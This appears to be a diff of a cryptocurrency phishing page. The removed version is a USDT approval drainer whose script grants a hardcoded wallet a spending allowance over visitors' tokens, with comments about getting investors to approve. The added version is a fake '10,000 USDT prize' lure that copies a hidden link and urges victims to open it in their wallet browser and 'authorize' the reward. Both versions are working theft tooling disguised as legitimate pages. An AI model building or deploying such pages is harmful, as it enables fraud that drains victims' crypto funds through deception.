@@ -1,66 +1,292 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Approve USDT to My Wallet</title>
-  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Congrats! Claim Your 10,000 USDT Prize!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@600;800;900&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: "Inter", sans-serif;
+      background: #0a0a0a;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow: hidden;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 50% 20%, rgba(30, 30, 60, 0.3), transparent 70%);
+      z-index: -1;
+      animation: bgElegant 8s ease-in-out infinite;
+    }
+    @keyframes bgElegant {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 0.4; }
+    }
+    .container {
+      background: linear-gradient(180deg, #121212, #080808);
+      border-radius: 28px;
+      padding: 60px 40px;
+      max-width: 900px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 25px rgba(30, 30, 60, 0.3);
+      text-align: center;
+      border: 1px solid rgba(60, 60, 90, 0.5);
+      position: relative;
+      animation: slideIn 1.2s ease-out;
+      z-index: 1;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .container::after {
+      content: "";
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      border-radius: 32px;
+      background: linear-gradient(45deg, #1e1e3c, #404070, #1e1e3c);
+      filter: blur(12px);
+      opacity: 0.3;
+      z-index: -1;
+      animation: borderGlow 6s infinite ease-in-out;
+    }
+    @keyframes borderGlow {
+      0%, 100% { opacity: 0.3; }
+      50% { opacity: 0.5; }
+    }
+    h2 {
+      font-size: 50px;
+      font-weight: 900;
+      color: #ffffff;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px rgba(60, 60, 90, 0.7);
+      animation: titleShine 2s ease-in-out infinite;
+      position: relative;
+    }
+    h2::before {
+      content: "🏆";
+      position: absolute;
+      left: -40px;
+      top: 10px;
+      font-size: 28px;
+      animation: bounce 1.5s infinite;
+    }
+    h2::after {
+      content: "🏆";
+      position: absolute;
+      right: -40px;
+      top: 10px;
+      font-size: 28px;
+      animation: bounce 1.5s infinite 0.3s;
+    }
+    @keyframes titleShine {
+      0%, 100% { text-shadow: 0 0 10px rgba(60, 60, 90, 0.7); }
+      50% { text-shadow: 0 0 15px rgba(60, 60, 90, 0.9); }
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+    .intro-text {
+      font-size: 22px;
+      color: #b0b0b0;
+      margin-bottom: 30px;
+      line-height: 1.6;
+      font-weight: 500;
+    }
+    .highlight {
+      color: #d4af37;
+      font-weight: 700;
+      text-shadow: 0 0 8px rgba(212, 175, 55, 0.6);
+    }
+    .link-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 40px;
+      padding: 15px;
+    }
+    .link-box {
+      display: none; /* Hide the link text */
+    }
+    button {
+      background: linear-gradient(90deg, #1e1e3c, #404070);
+      border: none;
+      border-radius: 50px;
+      padding: 20px 80px;
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(60, 60, 90, 0.4);
+      transition: all 0.3s ease;
+      width: 300px;
+    }
+    button::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -150%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    button:hover::before {
+      left: 150%;
+    }
+    button:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 10px 20px rgba(60, 60, 90, 0.6);
+      background: linear-gradient(90deg, #404070, #1e1e3c);
+    }
+    button:active {
+      transform: translateY(0);
+      box-shadow: 0 5px 15px rgba(60, 60, 90, 0.4);
+    }
+    .status {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #b0b0b0;
+      min-height: 24px;
+      transition: color 0.3s ease;
+      animation: fadeInStatus 0.5s ease-out;
+    }
+    .status.success {
+      color: #d4af37;
+    }
+    @keyframes fadeInStatus {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .confetti {
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      background: rgba(212, 175, 55, 0.6);
+      border-radius: 2px;
+      pointer-events: none;
+      animation: confettiFall 5s linear infinite;
+    }
+    @keyframes confettiFall {
+      0% { transform: translateY(-100vh) rotate(0deg); opacity: 0.7; }
+      100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+    }
+    .coin {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="rgba(212,175,55,0.8)" stroke-width="2"><circle cx="12" cy="12" r="10"/><text x="12" y="16" font-size="8" text-anchor="middle" fill="rgba(212,175,55,0.8)">$</text></svg>') no-repeat center;
+      background-size: contain;
+      pointer-events: none;
+      animation: coinFloat 6s linear infinite;
+    }
+    @keyframes coinFloat {
+      0% { transform: translateY(0) rotate(0deg); opacity: 0.6; }
+      100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 30px 20px;
+      }
+      h2 {
+        font-size: 34px;
+        letter-spacing: 1px;
+      }
+      .intro-text {
+        font-size: 18px;
+      }
+      button {
+        padding: 16px 60px;
+        font-size: 18px;
+        width: 100%;
+      }
+      .link-container {
+        flex-direction: column;
+        gap: 15px;
+      }
+    }
+  </style>
 </head>
 <body>
-
-<h2>اضغط على الزر لتفويض محفظتي بصرف USDT</h2>
-
-<button id="approveBtn">Approve USDT</button>
-
-<script>
-  // عنوان عقد USDT الرسمي على Ethereum Mainnet
-  const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-
-  // عنوان محفظتك (اللي هيتم التفويض لها)
-  const spenderAddress = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';
-
-  // الكمية اللي عايز المستثمرين يوافقوا عليها (1000 USDT مثلاً)
-  // USDT تستخدم 6 أرقام عشرية
-  const amountToApprove = ethers.utils.parseUnits("1000.0", 6);
-
-  // ABI مبسط لدالة approve
-  const abi = [
-    "function approve(address spender, uint256 amount) public returns (bool)"
-  ];
-
-  async function approve() {
-    // التأكد من وجود MetaMask أو محفظة تدعم Ethereum في المتصفح
-    if (typeof window.ethereum === 'undefined') {
-      alert('MetaMask أو محفظة Ethereum غير موجودة في المتصفح!');
-      return;
+  <div class="container">
+    <h2>Congratulations! You’ve Won!</h2>
+    <p class="intro-text">
+      <span class="highlight">Congratulations! Your email has been selected to claim a massive 10,000 USDT prize!</span> Click the button below to copy the reward link, then paste it into your wallet’s browser (e.g., MetaMask, Trust Wallet, or TronLink) to authorize and secure your exclusive prize. Act now to unlock this prestigious reward!
+    </p>
+    <div class="link-container">
+      <div class="link-box" id="rewardLink">https://aaaccsss.github.io/aaaaa/</div>
+      <button onclick="copyLink()">Copy Link</button>
+    </div>
+    <p class="status" id="statusText"></p>
+  </div>
+  <script>
+    // Add subtle confetti and coin animations
+    function createConfetti() {
+      const confetti = document.createElement("div");
+      confetti.classList.add("confetti");
+      confetti.style.left = `${Math.random() * 100}vw`;
+      confetti.style.animationDuration = `${Math.random() * 3 + 4}s`;
+      confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+      document.body.appendChild(confetti);
+      setTimeout(() => confetti.remove(), 5000);
     }
-
-    try {
-      // طلب صلاحية الوصول لمحفظة المستخدم
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-      // إنشاء مزود وموقع للمعاملة
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-
-      // ربط العقد الذكي
-      const contract = new ethers.Contract(tokenAddress, abi, signer);
-
-      // تنفيذ دالة approve
-      const tx = await contract.approve(spenderAddress, amountToApprove);
-
-      alert('تم إرسال المعاملة! رقم المعاملة:\n' + tx.hash);
-
-      // انتظار تأكيد المعاملة
-      await tx.wait();
-
-      alert('تم تأكيد التفويض بنجاح!');
-    } catch (error) {
-      alert('حدث خطأ: ' + error.message);
+    function createCoin() {
+      const coin = document.createElement("div");
+      coin.classList.add("coin");
+      coin.style.left = `${Math.random() * 100}vw`;
+      coin.style.animationDuration = `${Math.random() * 3 + 5}s`;
+      document.body.appendChild(coin);
+      setTimeout(() => coin.remove(), 6000);
     }
-  }
+    setInterval(createConfetti, 600);
+    setInterval(createCoin, 800);
 
-  // ربط الزر مع الدالة
-  document.getElementById('approveBtn').onclick = approve;
-</script>
-
+    // Copy link to clipboard
+    function copyLink() {
+      const link = document.getElementById("rewardLink").textContent;
+      navigator.clipboard.writeText(link).then(() => {
+        const statusText = document.getElementById("statusText");
+        statusText.textContent = "Link copied to clipboard!";
+        statusText.classList.add("success");
+        setTimeout(() => {
+          statusText.textContent = "";
+          statusText.classList.remove("success");
+        }, 3000);
+      }).catch(() => {
+        const statusText = document.getElementById("statusText");
+        statusText.textContent = "Failed to copy link. Please try again.";
+        setTimeout(() => {
+          statusText.textContent = "";
+        }, 3000);
+      });
+    }
+  </script>
 </body>
 </html>
